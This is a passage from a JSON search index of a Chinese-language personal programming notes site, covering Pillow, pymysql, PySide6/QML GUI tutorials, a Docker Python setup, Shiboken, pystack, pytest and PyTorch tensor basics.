image.transpose(Image.FLIP_LEFT_RIGHT) # 左右翻转\nim = im.transpose(Image.FLIP_TOP_BOTTOM)# 上下翻转 像素值操作 像素值操作: out = image.point(lambda i: i * 1.2) # 对每个像素值乘以 1.2\n\nsource = image.split()\nout = source[0].point(lambda i: i > 128 and 255) # 对 R 通道进行二值化 和Numpy数组之间的转化 和 Numpy 数组之间的转化: array = np.array(image)\nprint(array.shape) #(321, 481, 3)\nout = Image.fromarray(array) 图像缩放滤波器-Pillow库 在Pillow库中，常用的图像缩放滤波器有以下几种： Image.NEAREST: 最近邻滤波器。它选择距离缩放后位置最近的像素作为新像素值，缩放速度快但效果较差。 Image.BOX: 均值滤波器。它计算在缩放前覆盖每个输出像素的所有输入像素的平均值，并使用该平均值作为新像素值。比最近邻滤波器更平滑，但也可能导致图像失真。 Image.BILINEAR: 双线性滤波器。它通过对距离缩放后位置最近的四个像素进行加权平均来计算新像素值。比均值滤波器和最近邻滤波器更平滑，但可能会丢失一些细节。 Image.HAMMING: 汉明窗口函数滤波器。它将输入像素与一个汉明窗口函数进行卷积，以平滑图像并减少锯齿状失真。具有较高的计算复杂性，但效果很好。 Image.BICUBIC: 双三次插值滤波器。它通过在距离缩放后位置最近的16个像素上应用双三次插值来计算新像素值。比双线性滤波器更平滑，但可能会丢失一些细节。 Image.LANCZOS: 兰索斯滤波器。它通过在距离缩放后位置最近的若干个像素上应用一个基于兰索斯函数的卷积核来计算新像素值。它提供了最高的质量，但计算复杂度也最高。 每种滤波器都有其适用的场景和优缺点。\n通常，如果需要快速处理大量图像，则可以使用Image.NEAREST或Image.BOX滤波器。\n如果需要减少锯齿状失真并保留更多的细节，则可以使用Image.BILINEAR或Image.BICUBIC滤波器。\n如果您需要最高质量的缩放，例如用于摄影或印刷品，那么可以使用Image.LANCZOS滤波器，但需要注意它的计算复杂度较高。 ps: 现在高版本使用的是 Image.Resampling.xxx , 如缩放时使用 LANCZOS 滤波器: with Image.open(img_file) as im:\n  # 计算缩放后的图片大小\n  # im.convert('RGB')\n  width, height = im.size\n  new_width, new_height = int(width * scale), int(height * scale)\n  size = (new_width, new_height)\n\n  # 缩放图像\n  resized_im = im.resize(size, resample=Image.Resampling.LANCZOS)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pillow.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pillow.html"},{"title":"playwright","text":"与 index 类似 一个较新的自动化测试框架.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-playwright.html","loc":"/yq-docs-rear-end-python-python-three--party-library-playwright.html"},{"title":"pyaml","text":"提供对 yaml 格式文件的操作, 类似 json 安装: pip install pymal","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyaml.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyaml.html"},{"title":"pymysql","text":"安装: pip install pymysql 提供数据库操作: import pymysql\n\ndb = pymysql.connect(\n    host='127.0.0.1',\n    user='user',\n    password='password',\n    database='database'\n)\n\ncur = db.cursor()\n\ntry:\n    cur.execute('show tables;')\n    result = cur.fetchone()\n    print(result)\n\n    cur.execute('select user();')\n    result = cur.fetchone()\n    print(result)\n    db.commit()\nexcept Exception as e:\n    db.rollback()\nfinally:\n    db.close()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pymysql.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pymysql.html"},{"title":"pySerial","text":"与串口设备通信的包. 多用与嵌入式领域.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyserial.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyserial.html"},{"title":"数据可视化工具","text":"从CSV获取数据 读取CSV数据的几种方式: 直接读取 使用 csv 库: csv numpy: numpy pandas: pandas 以使用 pandas 为例: import argparse\nimport pandas as pd\n\n\ndef read_data(fname):\n    return pd.read_csv(fname)\n\n\nif __name__ == \"__main__\":\n    options = argparse.ArgumentParser()\n    options.add_argument(\"-f\", \"--file\", type=str, required=True)\n    args = options.parse_args()\n    data = read_data(args.file)\n    print(data) 数据过滤 QDateTime 设置时间 QTimeZone 设置时区 例: import argparse\nimport pandas as pd\n\nfrom PySide6.QtCore import QDateTime, QTimeZone\n\n\ndef transform_date(utc, timezone=None):\n    utc_fmt = \"yyyy-MM-ddTHH:mm:ss.zzzZ\"\n    new_date = QDateTime().fromString(utc, utc_fmt)\n    if timezone:\n        new_date.setTimeZone(timezone)\n    return new_date\n\n\ndef read_data(fname):\n    # Read the CSV content\n    df = pd.read_csv(fname)\n\n    # Remove wrong magnitudes\n    df = df.drop(df[df.mag < 0].index)\n    magnitudes = df[\"mag\"]\n\n    # My local timezone\n    timezone = QTimeZone(b\"Europe/Berlin\")\n\n    # Get timestamp transformed to our timezone\n    times = df[\"time\"].apply(lambda x: transform_date(x, timezone))\n\n    return times, magnitudes\n\n\nif __name__ == \"__main__\":\n    options = argparse.ArgumentParser()\n    options.add_argument(\"-f\", \"--file\", type=str, required=True)\n    args = options.parse_args()\n    data = read_data(args.file)\n    print(data) 使用 QMainWindow QMainWindow 是一个预定义的 GUI 主界面框架/结构: 源码: from PySide6.QtCore import Slot\nfrom PySide6.QtGui import QAction, QKeySequence\nfrom PySide6.QtWidgets import QMainWindow\n\n\nclass MainWindow(QMainWindow):\n    def __init__(self):\n        QMainWindow.__init__(self)\n        self.setWindowTitle(\"Eartquakes information\")\n\n        # Menu\n        self.menu = self.menuBar()\n        self.file_menu = self.menu.addMenu(\"File\")\n\n        # Exit QAction\n        exit_action = QAction(\"Exit\", self)\n        exit_action.setShortcut(QKeySequence.Quit)\n        exit_action.triggered.connect(self.close)\n\n        self.file_menu.addAction(exit_action)\n\n        # Status Bar\n        self.status = self.statusBar()\n        self.status.showMessage(\"Data loaded and plotted\")\n\n        # Window dimensions\n        geometry = self.screen().availableGeometry()\n        self.setFixedSize(geometry.width() * 0.8, geometry.height() * 0.7) 增加 QTableView QTableView 需要一个模型来显示数据. 可以使用 QAbstractTableModel 的实例. 注解 也可以使用更便捷的控件 QTableWidget. 相对减少代码量(不用写数据模型), 但是也降低了大数据时的性能, 不够灵活. 对于 QAbstractTableModel: headerData, 实现此方法来定义表格标题 rowCount, 表格行数 columnCount, 表格列数 例, 自定义数据类 CustomTableModel from PySide6.QtCore import Qt, QAbstractTableModel, QModelIndex\nfrom PySide6.QtGui import QColor\n\n\nclass CustomTableModel(QAbstractTableModel):\n    def __init__(self, data=None):\n        QAbstractTableModel.__init__(self)\n        self.load_data(data)\n\n    def load_data(self, data):\n        self.input_dates = data[0].values\n        self.input_magnitudes = data[1].values\n\n        self.column_count = 2\n        self.row_count = len(self.input_magnitudes)\n\n    def rowCount(self, parent=QModelIndex()):\n        return self.row_count\n\n    def columnCount(self, parent=QModelIndex()):\n        return self.column_count\n\n    def headerData(self, section, orientation, role):\n        if role != Qt.DisplayRole:\n            return None\n        if orientation == Qt.Horizontal:\n            return (\"Date\", \"Magnitude\")[section]\n        else:\n            return f\"{section}\"\n\n    def data(self, index, role=Qt.DisplayRole):\n        column = index.column()\n        row = index.row()\n\n        if role == Qt.DisplayRole:\n            if column == 0:\n                date = self.input_dates[row].toPython()\n                return str(date)[:-3]\n            elif column == 1:\n                magnitude = self.input_magnitudes[row]\n                return f\"{magnitude:.2f}\"\n        elif role == Qt.BackgroundRole:\n            return QColor(Qt.white)\n        elif role == Qt.TextAlignmentRole:\n            return Qt.AlignRight\n\n        return None 创建表格: from PySide6.QtWidgets import (QHBoxLayout, QHeaderView, QSizePolicy,\n                            QTableView, QWidget)\n\nfrom table_model import CustomTableModel\n\n\nclass Widget(QWidget):\n    def __init__(self, data):\n        QWidget.__init__(self)\n\n        # Getting the Model\n        self.model = CustomTableModel(data)\n\n        # Creating a QTableView\n        self.table_view = QTableView()\n        self.table_view.setModel(self.model)\n\n        # QTableView Headers\n        self.horizontal_header = self.table_view.horizontalHeader()\n        self.vertical_header = self.table_view.verticalHeader()\n        self.horizontal_header.setSectionResizeMode(\n                            QHeaderView.ResizeToContents\n                            )\n        self.vertical_header.setSectionResizeMode(\n                            QHeaderView.ResizeToContents\n                            )\n        self.horizontal_header.setStretchLastSection(True)\n\n        # QWidget Layout\n        self.main_layout = QHBoxLayout()\n        size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)\n\n        ## Left layout\n        size.setHorizontalStretch(1)\n        self.table_view.setSizePolicy(size)\n        self.main_layout.addWidget(self.table_view)\n\n        # Set the layout to the QWidget\n        self.setLayout(self.main_layout) 增加图片视图 QtCharts 使用 QtCharts QChartView 注解 在 QChartView 内放置 QtCharts 设计一个空的 图表: from PySide6.QtCore import QDateTime, Qt\nfrom PySide6.QtGui import QPainter\nfrom PySide6.QtWidgets import (QWidget, QHeaderView, QHBoxLayout, QTableView,\n                            QSizePolicy)\nfrom PySide6.QtCharts import QChart, QChartView, QLineSeries, QDateTimeAxis, QValueAxis\n\nfrom table_model import CustomTableModel\n\n\nclass Widget(QWidget):\n    def __init__(self, data):\n        QWidget.__init__(self)\n\n        # Getting the Model\n        self.model = CustomTableModel(data)\n\n        # Creating a QTableView\n        self.table_view = QTableView()\n        self.table_view.setModel(self.model)\n\n        # QTableView Headers\n        self.horizontal_header = self.table_view.horizontalHeader()\n        self.vertical_header = self.table_view.verticalHeader()\n        self.horizontal_header.setSectionResizeMode(QHeaderView.ResizeToContents)\n        self.vertical_header.setSectionResizeMode(QHeaderView.ResizeToContents)\n        self.horizontal_header.setStretchLastSection(True)\n\n        # Creating QChart\n        self.chart = QChart()\n        self.chart.setAnimationOptions(QChart.AllAnimations)\n\n        # Creating QChartView\n        self.chart_view = QChartView(self.chart)\n        self.chart_view.setRenderHint(QPainter.Antialiasing)\n\n        # QWidget Layout\n        self.main_layout = QHBoxLayout()\n        size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)\n\n        ## Left layout\n        size.setHorizontalStretch(1)\n        self.table_view.setSizePolicy(size)\n        self.main_layout.addWidget(self.table_view)\n\n        ## Right Layout\n        size.setHorizontalStretch(4)\n        self.chart_view.setSizePolicy(size)\n        self.main_layout.addWidget(self.chart_view)\n\n        # Set the layout to the QWidget\n        self.setLayout(self.main_layout) 绘制图表 在上一节使用 QtCharts 的基础上 根据CSV文件的数据来绘制图表 QLineSeries, 折线图 例: from PySide6.QtCore import QDateTime, Qt\nfrom PySide6.QtGui import QPainter\nfrom PySide6.QtWidgets import (QWidget, QHeaderView, QHBoxLayout, QTableView,\n                            QSizePolicy)\nfrom PySide6.QtCharts import QChart, QChartView, QLineSeries, QDateTimeAxis, QValueAxis\n\nfrom table_model import CustomTableModel\n\n\nclass Widget(QWidget):\n    def __init__(self, data):\n        QWidget.__init__(self)\n\n        # Getting the Model\n        self.model = CustomTableModel(data)\n\n        # Creating a QTableView\n        self.table_view = QTableView()\n        self.table_view.setModel(self.model)\n\n        # QTableView Headers\n        resize = QHeaderView.ResizeToContents\n        self.horizontal_header = self.table_view.horizontalHeader()\n        self.vertical_header = self.table_view.verticalHeader()\n        self.horizontal_header.setSectionResizeMode(resize)\n        self.vertical_header.setSectionResizeMode(resize)\n        self.horizontal_header.setStretchLastSection(True)\n\n        # Creating QChart\n        self.chart = QChart()\n        self.chart.setAnimationOptions(QChart.AllAnimations)\n        self.add_series(\"Magnitude (Column 1)\", [0, 1])\n\n        # Creating QChartView\n        self.chart_view = QChartView(self.chart)\n        self.chart_view.setRenderHint(QPainter.Antialiasing)\n\n        # QWidget Layout\n        self.main_layout = QHBoxLayout()\n        size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)\n\n        # Left layout\n        size.setHorizontalStretch(1)\n        self.table_view.setSizePolicy(size)\n        self.main_layout.addWidget(self.table_view)\n\n        # Right Layout\n        size.setHorizontalStretch(4)\n        self.chart_view.setSizePolicy(size)\n        self.main_layout.addWidget(self.chart_view)\n\n        # Set the layout to the QWidget\n        self.setLayout(self.main_layout)\n\n    def add_series(self, name, columns):\n        # Create QLineSeries\n        self.series = QLineSeries()\n        self.series.setName(name)\n\n        # Filling QLineSeries\n        for i in range(self.model.rowCount()):\n            # Getting the data\n            t = self.model.index(i, 0).data()\n            date_fmt = \"yyyy-MM-dd HH:mm:ss.zzz\"\n\n            x = QDateTime().fromString(t, date_fmt).toSecsSinceEpoch()\n            y = float(self.model.index(i, 1).data())\n\n            if x > 0 and y > 0:\n                self.series.append(x, y)\n\n        self.chart.addSeries(self.series)\n\n        # Setting X-axis\n        self.axis_x = QDateTimeAxis()\n        self.axis_x.setTickCount(10)\n        self.axis_x.setFormat(\"dd.MM (h:mm)\")\n        self.axis_x.setTitleText(\"Date\")\n        self.chart.addAxis(self.axis_x, Qt.AlignBottom)\n        self.series.attachAxis(self.axis_x)\n        # Setting Y-axis\n        self.axis_y = QValueAxis()\n        self.axis_y.setTickCount(10)\n        self.axis_y.setLabelFormat(\"%.2f\")\n        self.axis_y.setTitleText(\"Magnitude\")\n        self.chart.addAxis(self.axis_y, Qt.AlignLeft)\n        self.series.attachAxis(self.axis_y)\n\n        # Getting the color from the QChart to use it on the QTableView\n        color_name = self.series.pen().color().name()\n        self.model.color = f\"{color_name}\"","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Data-visualization-tool.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Data-visualization-tool.html"},{"title":"工具/结构介绍","text":"PySide6项目 .ui 控件布局设计文件 .qrc 资源文件 .qmltype 控件开发相关GUI工具 Widget 开发 一般绘制前端界面时, 使用GUI工具手动绘制具有实时可见性(相对于手写py代码开发而言) 而此工具只有在手动画界面时使用. pyside6-designer, GUI界面开发工具, 生成 .ui 文件 pyside6-uic, 将 .ui 文件转换为 python 代码 pyside6-rcc, to generate serialized data from .qrc resources files.\nKeep in mind these files can be used in other non-widget projects. 注解 直接使用 pyside6-designer 即可启动, 而不是去安装目录下直接点开. 因为有一些环境变量的加载是必要的. 见 工具启动 QML 开发 pyside6-qmllint, 验证 .qmltype 是否存在语法错误. pyside6-qmltyperegistrar, 读取 元类型文件 并 生成包含注册这些类型为相关宏 的文件 原文: to read metatypes files and generate files that contain the necessary code\nto register all the types marked with relevant macros. pyside6-qmlimportscanner, 定义项目需要导入的 QML 模块, 并将结果装载为json数组. 理解可能有点问题, 原文: to identify the QML modules imported from a project/QML files and\ndump the result as a JSON array. 有误后面实际使用了再补充. 其他工具/指令 pyside6-assistant, 打开在线文档(Qt Help) pyside6-genpyi, 将 Qt 模块编译为 .pyi 文件. pyside6-metaobjectdump, 打印元类型信息的工具, 元类型信息从 qmltyperegistrar 生成的 JSON 中读取 pyside6-deploy, to deploy desktop applications in Linux,\nWindows and macOS environments. 工具启动 部分工具是直接放置到python pip安装目录下的, Windows下体现为 .exe 文件, Mac下体现为 .app . 不建议直接去安装目录下点击此文件而启动, 而是使用 pyside6- 前缀,\n因为, 有部分环境变量插件等需要正确加载, 否则相关部分可能无法正常使用. 比如, Mac 安装环境下的designer是 Designer.app , 使用 pyside6-designer 来启动: (dev_venv) yanque@mbp14 project % ls /Users/yanque/project/python_venv/dev_venv/lib/python3.9/site-packages/PySide6 | grep Design\nDesigner.app\nQtDesigner.abi3.so\nQtDesigner.pyi\n(dev_venv) yanque@mbp14 project % pyside6-designer\nError: Qt Designer: The QWebEngineView custom widget plugin is disabled because it requires OpenGL/Software RHI (current: 6).\nQt Designer: The QQuickWidget custom widget plugin is disabled because it requires OpenGL RHI (current: 6).\nDesigner: 为类 QQuickWidget 的窗口部件注册的自定义窗口部件工厂返回 0。\n** WARNING Factory failed to create  \"QQuickWidget\"\nQt Designer: The QWebEngineView custom widget plugin is disabled because it requires OpenGL/Software RHI (current: 6).\n\nwhile executing '/Users/yanque/project/python_venv/dev_venv/lib/python3.9/site-packages/PySide6/Designer.app/Contents/MacOS/Designer'","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Project-Introduction.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Project-Introduction.html"},{"title":"QML(源于官方文档)","text":"相关资源: QML实际使用 相关资源: 所有QML控件: https://doc.qt.io/qt-6/qmltypes.html Qt设计的一种类似 CSS, JSON 的语言, 同时允许 JavaScript , 用于创建 UI 应用 可被其他组件集成, 可被 C++ 代码使用. 相对于传统 Python 代码中编写方式而言, 使用声明式 QML 更自然, 便捷, 开发 UI 部分更快速. 在官网教程中, 标题为 Your First QtQuick/QML Application ,\n私以为 QtQuick 就是 QML. (待考证) 官网地址:: Your First QtQuick/QML Application 可用模块 QtQml QtQuick 结构 一个 QML 至少由两个文件组成. QML UI 描述文件 加载 QML 的 Python 代码文件 例, 一个简单的 QML 文件 view.qml import QtQuick\n\nRectangle {\n    id: main\n    width: 200\n    height: 200\n    color: \"green\"\n\n    Text {\n        text: \"Hello World\"\n        anchors.centerIn: main\n    }\n} QtQuick 是一个 QML 模块. Python 加载代码 main.py import sys\nfrom PySide6.QtWidgets import QApplication\nfrom PySide6.QtQuick import QQuickView\n\nif __name__ == \"__main__\":\n    app = QApplication()\n    view = QQuickView()\n\n    view.setSource(\"view.qml\")\n    view.show()\n    sys.exit(app.exec()) 运行桌面应用时, 应该在 show 之前加入更新大小的代码: view.setResizeMode(QQuickView.SizeRootObjectToView)\nview.show() 整合QML到Python 官网地址: Python-QML integration 其实与上面的例子基本一致. 就是多了事件的部分. 加载 QML 文件: if __name__ == '__main__':\n    app = QGuiApplication(sys.argv)\n    QQuickStyle.setStyle(\"Material\")\n    engine = QQmlApplicationEngine()\n\n    # Get the path of the current directory, and then add the name\n    # of the QML file, to load it.\n    qml_file = Path(__file__).parent / 'view.qml'\n    engine.load(qml_file)\n\n    if not engine.rootObjects():\n        sys.exit(-1) 只需要 QQmlApplicationEngine 来加载 QML 文件. 使用 @QmlElement 定义 QML 定义的控件相应的事件: # To be used on the @QmlElement decorator\n# (QML_IMPORT_MINOR_VERSION is optional)\nQML_IMPORT_NAME = \"io.qt.textproperties\"\nQML_IMPORT_MAJOR_VERSION = 1\n\n@QmlElement\nclass Bridge(QObject):\n\n    @Slot(str, result=str)\n    def getColor(self, s):\n        if s.lower() == \"red\":\n            return \"#ef9a9a\"\n        elif s.lower() == \"green\":\n            return \"#a5d6a7\"\n        elif s.lower() == \"blue\":\n            return \"#90caf9\"\n        else:\n            return \"white\"\n\n    @Slot(float, result=int)\n    def getSize(self, s):\n        size = int(s * 34)\n        if size <= 0:\n            return 1\n        else:\n            return size\n\n    @Slot(str, result=bool)\n    def getItalic(self, s):\n        if s.lower() == \"italic\":\n            return True\n        else:\n            return False\n\n    @Slot(str, result=bool)\n    def getBold(self, s):\n        if s.lower() == \"bold\":\n            return True\n        else:\n            return False 在 QML 中定义相关部分(信号与槽): Bridge {\n  id: bridge\n} 比如, 点击按钮相关部分: RadioButton {\n    id: italic\n    Layout.alignment: Qt.AlignLeft\n    text: \"Italic\"\n    onToggled: {\n        leftlabel.font.italic = bridge.getItalic(italic.text)\n        leftlabel.font.bold = bridge.getBold(italic.text)\n        leftlabel.font.underline = bridge.getUnderline(italic.text)\n\n    }\n} 以下配置使用 style 触发: python main.py --style material 还可以加入 .conf 文件 qtquickcontrols2.conf [Controls]\nStyle=Material\n\n[Universal]\nTheme=System\nAccent=Red\n\n[Material]\nTheme=Dark\nAccent=Red 加到 .qrc 文件: <!DOCTYPE RCC><RCC version=\"1.0\">\n<qresource prefix=\"/\">\n    <file>qtquickcontrols2.conf</file>\n</qresource>\n</RCC> 生成 Python 代码: pyside6-rcc style.qrc > style_rc.py 导入到 main.py import sys\nfrom pathlib import Path\n\nfrom PySide6.QtCore import QObject, Slot\nfrom PySide6.QtGui import QGuiApplication\nfrom PySide6.QtQml import QQmlApplicationEngine, QmlElement\nfrom PySide6.QtQuickControls2 import QQuickStyle\n\nimport style_rc 源码下载 view.qml: ../../../../../../resources/code/pyside6/qml_example/view.qml main.py: ../../../../../../resources/code/pyside6/qml_example/main.py 预览 : view.qml main.py 使用 QtCreator 下载: <https://download.qt.io/snapshots/qtcreator/> 注意安装的时候需要使用账户, 去 官网 注册一个账户即可. 官网使用教程: QML Application Tutorial 与数据库(SQL)结合 官网: QML, SQL and PySide Integration Tutorial 有时间按照教程试试 记录实际使用过程中的一些坑 Python与QML的交互 方式一是注册QML控件 就像官网给的例子, 在Python的入口文件定义 # To be used on the @QmlElement decorator # (QML_IMPORT_MINOR_VERSION is optional) QML_IMPORT_NAME = \"io.qt.textproperties\" QML_IMPORT_MAJOR_VERSION = 1 在QML中使用的时候直接导入即可( 导入的时候没有引号 ) import io . qt . textproperties 1.0 Bridge { id: bridge } 这里要注意, 因为官网是直接定义在入口文件的, 所以不用手动注册,\n如果不是定义在入口文件, 需要手动注册, 比如 QML_IMPORT_NAME = \"io.qt.textproperties\" QML_IMPORT_MAJOR_VERSION = 1 @QmlElement class Bridge ( QObject ): ... # 手动注册 qmlRegisterType ( Bridge , QML_IMPORT_NAME , QML_IMPORT_MAJOR_VERSION , 0 , \"Bridge\" ) 方式二是设置上下文 类似这样 bridge = Bridge () engine . rootContext () . setContextProperty ( \"bridge\" , bridge ) 在QML使用的时候, 就不用手动定义 Bridge , 而是直接调用 bridge . xxx","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML.html"},{"title":"使用docker安装","text":"使用 指定版本安装 Python 并进入: docker run --name python39 -itd -p 2222:22 python:3.9\ndocker exec -it python39 /bin/bash\n\n# 就不换源了, 感觉三方源还不如官方源快\napt update\napt install vim ssh iproute2 rsync\n\n# vim  /etc/ssh/sshd_config 允许root登录\n\n# 更新密码\npasswd\n\n# 配置 pip 源\ncd ~\nmkdir .pip && cd .pip\necho \"[global]\nindex-url = https://pypi.douban.com/simple/\n[install]\ntrusted-host=pypi.douban.com\n\" >pip.conf\n\npip install pyside6","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Use-docker-installation.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Use-docker-installation.html"},{"title":"Shiboken","text":"安装 pyside6 自带的模块 可使用其访问一些内部信息, 一般用于 debug 使用 Shiboken 创建的对象都是 Python 对象 注解 其实就是将 C++ 对象转换为可调用的 Python 对象 一些工具方法: def isValid (obj) def wrapInstance (address, type) def getCppPointer (obj) def delete (obj) def isOwnedByPython (obj) def wasCreatedByPython (obj) def dump (obj) def disassembleFrame (marker) isValid def isValid (obj) 判断 obj 的方法是否可以正常使用而不抛出异常 当所指向的 C++ 对象已销毁或者不可达时, 装饰器无效. obj: Python 对象 wrapInstance def wrapInstance (address, type) 对 C++ 对象, 使用指定的 内存地址 address 创建一个 Python 装饰器, 返回值即所给类 type 的对象 address: 内存地址. 若地址不可用, 或者没指向指定 type 的 C++ 对象, 将会 undefined ? type: 使用来实例对象的类, 必须是 Shiboken 类型, 当返回对象在 Python 内部的引用计数不为0时, 相关联底层 C++ 对象不会被销毁 getCppPointer def getCppPointer (obj) 返回 被给定 obj 装饰的, 包含了 C++ 对象地址的长元组. delete def delete (obj) 删除被 obj 装饰的 C++ 对象 isOwnedByPython def isOwnedByPython (obj) -> bool obj: Python 对象, 如果不是 Shiboken 下的类型, 将会抛出 TypeError @retuen: bool True:  Python 可正确删除底层的 C++ 对象, 即 C++ 对象完全被 obj 所 代理 False: wasCreatedByPython def wasCreatedByPython (obj) -> bool 是否给定的对象是被 Python 创建 @return: bool True:  给定的对象是被 Python 创建\nFalse: dump def dump (obj) -> str 只应在 debug 时使用. 如果 obj 不是 Shiboken 下的类型, 将会打印信息 @return: str 返回对象的 str 信息, 还可能包含自己实现的相关信息 disassembleFrame def disassembleFrame (marker) 只应用于 debug 打印当前 Python 执行的堆栈信息并刷新, 打印的信息将会被 marker 所包裹. 如果想在此位置打断点(基于C++的断点), 可使用纯函数名. marker 在 C++ 下是一个 string. 如果是基于 Python 的断点, 在需要断点的位置使用此装饰器. marker 在 Python 下可以是任意对象, 将会调用对象内部的 str 方法 marker: 用于包裹打印出的堆栈信息","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken.html"},{"title":"Shiboken Generator","text":"官网:: Shiboken 待补充","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken-generator.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken-generator.html"},{"title":"pystack","text":"pypi: https://pypi.org/project/pystack/ github: https://github.com/bloomberg/pystack 查看其他python进程堆栈信息 安装, 此软件依赖与底层c库, 所以对于linux, mac等, 需要提前安装依赖库,\n即使没有从源码构建. mac这个库安装的时候一直找不到 elf.h, 放弃: In file included from src/pystack/_pystack.cpp:817:\nsrc/pystack/_pystack/elf_common.h:12:10: fatal error: 'elf.h' file not found\n#include <elf.h>\n          &#94;~~~~~~","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pystack.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pystack.html"},{"title":"Pytest测试用例查找不到问题","text":"检查测试的函数是不是以 test_ 开头,\n且\n测试函数所在文件名是不是以 test_ 开头或 _test 结尾.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytest-common-problem-Pytest-test-case-cannot-find-the-problem.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytest-common-problem-Pytest-test-case-cannot-find-the-problem.html"},{"title":"API","text":"torch提供的API torch.empty() 声明一个未初始化的 Tensors 矩阵. 如创建一个 5*3 的矩阵: x = torch.empty(5, 3) torch.rand() 随机初始化一个矩阵 创建一个随机初始化的 5*3 矩阵: rand_x = torch.rand(5, 3) torch.zeros() 创建数值皆为 0 的矩阵 创建一个数值皆是 0，类型为 long 的矩阵: zero_x = torch.zeros(5, 3, dtype=torch.long) torch.ones() 创建数值皆为 1 的矩阵 torch.tensor() 直接传递 tensor 数值来创建 tensor 数值是 [5.5, 3]: tensor1 = torch.tensor([5.5, 3])\nprint(tensor1) 输出结果: tensor([5.5000, 3.0000]) tensor.new_ones() 除了上述几种方法，还可以根据已有的 tensor 变量创建新的 tensor 变量，\n这种做法的好处就是可以保留已有 tensor 的一些属性，\n包括尺寸大小、数值属性，除非是重新定义这些属性。相应的实现方法如下: tensor.new_ones()   # new_*() 方法需要输入尺寸大小 如显示定义新的尺寸是 5*3，数值类型是 torch.double: tensor2 = tensor1.new_ones(5, 3, dtype=torch.double)  # new_* 方法需要输入 tensor 大小\nprint(tensor2) 输出结果: tensor([[1., 1., 1.],\n        [1., 1., 1.],\n        [1., 1., 1.],\n        [1., 1., 1.],\n        [1., 1., 1.]], dtype=torch.float64) torch.randn_like(old_tensor) 保留相同的尺寸大小 tensor.size() torch.Size 是元组(tuple)类型，所以支持所有的元组操作 torch.add() 加法实现: torch.add(tensor1, tensor2, [out=tensor3])\ntensor1.add_(tensor2)     # 直接修改 tensor 变量, 有后缀 _ 或者直接: tensor3 = tensor1 + tensor2 注解 可以改变 tensor 变量的操作都带有一个后缀 _, 例如: x.copy_(y)\nx.t_() 都可以改变 x 变量 torch.view() 修改 tensor 尺寸 如: x = torch.randn(4, 4)\ny = x.view(16)\n# -1 表示除给定维度外的其余维度的乘积\nz = x.view(-1, 8)\nprint(x.size(), y.size(), z.size()) 输出结果: torch.Size([4, 4]) torch.Size([16]) torch.Size([2, 8]) 如果 tensor 仅有一个元素，可以采用 .item() 来获取类似 Python 中整数类型的数值: x = torch.randn(1)\nprint(x)\nprint(x.item()) 输出结果: tensor([0.4549])\n0.4549027979373932 torch.from_numpy(numpy_array) Numpy 数组转换为 Tensor 在 CPU 上，除了 CharTensor 外的所有 Tensor 类型变量，都支持和 Numpy数组的相互转换操作 torch.device(\"cuda\") 定义一个 CUDA 设备对象 计算平均值mean 不带参数, 表示计算所有元素平均值 dim None, 表示计算所有元素平均值 0, 表示在张量的第一个维度（列）上进行操作 1, 表示在张量的第二个维度（行）上进行操作 如: # 创建一个示例张量\nx = torch.tensor([[1, 2, 3],\n                  [4, 5, 6],\n                  [7, 8, 9]], dtype=torch.float64)\n\n# 计算整个张量的平均值\nmean_all = x.mean()\nprint(mean_all)  # 输出: tensor(5., dtype=torch.float64)\n\n# 沿着特定维度计算平均值\nmean_dim0 = x.mean(dim=0)\nprint(mean_dim0)  # 输出: tensor([4., 5., 6.], dtype=torch.float64)\n\nmean_dim1 = x.mean(dim=1)\nprint(mean_dim1)  # 输出: tensor([2., 5., 8.], dtype=torch.float64) torch.nn torch.nn.conv2d(in_channels: int, out_channels: int, kernel_size: _size_2_t,) 卷积函数 in_channels 输入通道 out_channels 输出通道 kernel_size 卷积核大小","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytorch-API.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytorch-API.html"},{"title":"实例-训练分类器","text":"训练数据 在训练分类器前，当然需要考虑数据的问题。\n通常在处理如图片、文本、语音或者视频数据的时候，\n一般都采用标准的 Python 库将其加载并转成 Numpy 数组，然后再转回为 PyTorch 的张量。 对于图像，可以采用 Pillow, OpenCV 库； 对于语音，有 scipy 和 librosa; 对于文本，可以选择原生 Python 或者 Cython 进行加载数据，或者使用 NLTK 和 SpaCy 。 PyTorch 对于计算机视觉，特别创建了一个 torchvision 的库，\n它包含一个数据加载器(data loader)，可以加载比较常见的数据集，\n比如 Imagenet, CIFAR10, MNIST 等等，然后还有一个用于图像的数据转换器(data transformers)，\n调用的库是 torchvision.datasets 和 torch.utils.data.DataLoader 。 在本教程中，将采用 CIFAR10 数据集，它包含 10 